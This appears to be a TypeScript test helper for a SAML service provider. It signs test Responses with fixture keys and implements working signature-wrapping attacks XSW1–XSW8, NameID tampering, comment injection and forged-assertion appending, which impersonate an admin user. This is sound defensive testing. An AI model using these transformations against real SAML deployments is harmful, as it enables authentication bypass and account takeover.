// A test IdP in Node: builds SAML Responses and signs them with xml-crypto using the throwaway keys from
// scripts/gen-fixtures.mjs, plus the DOM surgery for the signature-wrapping (XSW) attacks.
import { randomBytes } from "node:crypto";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { DOMParser, XMLSerializer } from "@xmldom/xmldom";
import { SignedXml } from "xml-crypto";

const fixtures = join(import.meta.dirname, "..", "fixtures");
export const keys = {
  idp: { key: readFileSync(join(fixtures, "idp.key"), "utf8"), cert: readFileSync(join(fixtures, "idp.crt"), "utf8") },
  attacker: { key: readFileSync(join(fixtures, "attacker.key"), "utf8"), cert: readFileSync(join(fixtures, "attacker.crt"), "utf8") },
};

export const SP = "https://designer.spike.test/saml/acme";
export const IDP_ENTITY = "https://idp.spike.test/metadata";
const P = "urn:oasis:names:tc:SAML:2.0:protocol";
const A = "urn:oasis:names:tc:SAML:2.0:assertion";
const DS = "http://www.w3.org/2000/09/xmldsig#";

export const newId = () => "_" + randomBytes(16).toString("hex");
const iso = (ms: number) => new Date(ms).toISOString();

export interface ResponseOptions {
  inResponseTo: string | null;
  nameId?: string;
  issuer?: string;
  audience?: string;
  recipient?: string;
  destination?: string;
  /** offsets from now, in ms */
  notBefore?: number;
  notOnOrAfter?: number;
  assertionId?: string;
}

export function buildResponse(o: ResponseOptions): string {
  const now = Date.now();
  const nb = iso(now + (o.notBefore ?? -60_000));
  const noa = iso(now + (o.notOnOrAfter ?? 5 * 60_000));
  const irt = o.inResponseTo ? ` InResponseTo="${o.inResponseTo}"` : "";
  const issuer = o.issuer ?? IDP_ENTITY;
  return `<samlp:Response xmlns:samlp="${P}" xmlns:saml="${A}" ID="${newId()}" Version="2.0" IssueInstant="${iso(now)}" Destination="${o.destination ?? SP + "/acs"}"${irt}>` +
    `<saml:Issuer>${issuer}</saml:Issuer>` +
    `<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>` +
    `<saml:Assertion xmlns:saml="${A}" ID="${o.assertionId ?? newId()}" Version="2.0" IssueInstant="${iso(now)}">` +
    `<saml:Issuer>${issuer}</saml:Issuer>` +
    `<saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">${o.nameId ?? "eve@acme.test"}</saml:NameID>` +
    `<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="${noa}" Recipient="${o.recipient ?? SP + "/acs"}"${irt}/></saml:SubjectConfirmation></saml:Subject>` +
    `<saml:Conditions NotBefore="${nb}" NotOnOrAfter="${noa}"><saml:AudienceRestriction><saml:Audience>${o.audience ?? SP + "/metadata"}</saml:Audience></saml:AudienceRestriction></saml:Conditions>` +
    `<saml:AuthnStatement AuthnInstant="${iso(now)}" SessionIndex="${newId()}"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement>` +
    `</saml:Assertion></samlp:Response>`;
}

function sign(xml: string, target: "Assertion" | "Response", signer = keys.idp): string {
  const sig = new SignedXml({
    privateKey: signer.key,
    publicCert: signer.cert,
    signatureAlgorithm: "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256",
    canonicalizationAlgorithm: "http://www.w3.org/2001/10/xml-exc-c14n#",
  });
  const path = target === "Assertion" ? "/*[local-name(.)='Response']/*[local-name(.)='Assertion']" : "/*[local-name(.)='Response']";
  sig.addReference({
    xpath: path,
    digestAlgorithm: "http://www.w3.org/2001/04/xmlenc#sha256",
    transforms: ["http://www.w3.org/2000/09/xmldsig#enveloped-signature", "http://www.w3.org/2001/10/xml-exc-c14n#"],
  });
  sig.computeSignature(xml, { location: { reference: `${path}/*[local-name(.)='Issuer']`, action: "after" } });
  return sig.getSignedXml();
}

export const signAssertion = (xml: string, signer = keys.idp) => sign(xml, "Assertion", signer);
export const signResponse = (xml: string, signer = keys.idp) => sign(xml, "Response", signer);
export const signBoth = (xml: string, signer = keys.idp) => signResponse(signAssertion(xml, signer), signer);

// ---- DOM helpers for the attacks -------------------------------------------------------------------------------
export const parse = (xml: string) => new DOMParser().parseFromString(xml, "text/xml");
export const serialize = (doc: Document | Node) => new XMLSerializer().serializeToString(doc as Node);
const kids = (n: Element, ns: string, local: string) => Array.from(n.childNodes).filter((c): c is Element => c.nodeType === 1 && (c as Element).namespaceURI === ns && (c as Element).localName === local);
const assertionOf = (resp: Element) => kids(resp, A, "Assertion")[0];
const signatureOf = (el: Element) => kids(el, DS, "Signature")[0];
function setNameId(assertion: Element, value: string) {
  const nameId = assertion.getElementsByTagNameNS(A, "NameID")[0];
  while (nameId.firstChild) nameId.removeChild(nameId.firstChild);
  nameId.appendChild(nameId.ownerDocument.createTextNode(value));
}
function stripSignature(el: Element) { const s = signatureOf(el); if (s) el.removeChild(s); return el; }
const EVIL = "admin@acme.test";

/** The XSW1–XSW8 transformations (Somorovsky et al., "On Breaking SAML", 2012; SAML Raider's names). Input: a legitimately signed Response for eve. */
export const xsw: Record<string, (signedXml: string) => string> = {
  // Response-signature wrapping: the signed Response moves into (XSW1) or next to (XSW2) the Signature; a new root carries the evil assertion.
  XSW1(xml) {
    const doc = parse(xml); const root = doc.documentElement;
    const original = root.cloneNode(true) as Element;
    stripSignature(original);
    const sig = signatureOf(root);
    sig.appendChild(original);
    root.setAttribute("ID", newId());
    setNameId(assertionOf(root), EVIL);
    stripSignature(assertionOf(root));
    return serialize(doc);
  },
  XSW2(xml) {
    const doc = parse(xml); const root = doc.documentElement;
    const original = root.cloneNode(true) as Element;
    stripSignature(original);
    const sig = signatureOf(root);
    root.insertBefore(original, sig);
    root.setAttribute("ID", newId());
    setNameId(assertionOf(root), EVIL);
    stripSignature(assertionOf(root));
    return serialize(doc);
  },
  // Assertion-signature wrapping.
  XSW3(xml) { // evil unsigned assertion inserted before the signed one
    const doc = parse(xml); const root = doc.documentElement; const signed = assertionOf(root);
    const evil = stripSignature(signed.cloneNode(true) as Element); evil.setAttribute("ID", newId()); setNameId(evil, EVIL);
    root.insertBefore(evil, signed);
    return serialize(doc);
  },
  XSW4(xml) { // signed assertion becomes a child of the evil one
    const doc = parse(xml); const root = doc.documentElement; const signed = assertionOf(root);
    const evil = stripSignature(signed.cloneNode(true) as Element); evil.setAttribute("ID", newId()); setNameId(evil, EVIL);
    root.replaceChild(evil, signed); evil.appendChild(signed);
    return serialize(doc);
  },
  XSW5(xml) { // signed assertion's content changed in place; an unmodified unsigned copy appended to the Response
    const doc = parse(xml); const root = doc.documentElement; const signed = assertionOf(root);
    const copy = stripSignature(signed.cloneNode(true) as Element);
    setNameId(signed, EVIL); root.appendChild(copy);
    return serialize(doc);
  },
  XSW6(xml) { // as XSW5, the unmodified copy inside the signed assertion's Signature
    const doc = parse(xml); const root = doc.documentElement; const signed = assertionOf(root);
    const copy = stripSignature(signed.cloneNode(true) as Element);
    setNameId(signed, EVIL); signatureOf(signed).appendChild(copy);
    return serialize(doc);
  },
  XSW7(xml) { // the signed assertion hidden in samlp:Extensions, the evil one in its place
    const doc = parse(xml); const root = doc.documentElement; const signed = assertionOf(root);
    const ext = doc.createElementNS(P, "samlp:Extensions");
    const evil = stripSignature(signed.cloneNode(true) as Element); setNameId(evil, EVIL);
    root.replaceChild(evil, signed); ext.appendChild(signed); root.insertBefore(ext, evil);
    return serialize(doc);
  },
  XSW8(xml) { // the evil assertion carries the Signature, the unmodified original sits in a ds:Object inside it
    const doc = parse(xml); const root = doc.documentElement; const signed = assertionOf(root);
    const sig = signatureOf(signed);
    const original = stripSignature(signed.cloneNode(true) as Element);
    const obj = doc.createElementNS(DS, "ds:Object"); obj.appendChild(original); sig.appendChild(obj);
    setNameId(signed, EVIL);
    return serialize(doc);
  },
};

/** Change the signed NameID after signing (no wrapping) — the digest must fail. */
export function tamperNameId(xml: string, value = EVIL): string {
  const doc = parse(xml); setNameId(assertionOf(doc.documentElement), value); return serialize(doc);
}
/** Comment injection (CVE-2017-11427 class): split the NameID text with a comment; exclusive C14N drops comments, so the signature still verifies. */
export function injectComment(xml: string, before: string, after: string): string {
  return xml.replace(`>${before}${after}<`, `>${before}<!---->${after}<`);
}
/** Two assertions in one Response: the signed one and a forged one after it. */
export function appendForgedAssertion(xml: string): string {
  const doc = parse(xml); const root = doc.documentElement; const signed = assertionOf(root);
  const evil = stripSignature(signed.cloneNode(true) as Element); evil.setAttribute("ID", newId()); setNameId(evil, EVIL);
  root.appendChild(evil); return serialize(doc);
}
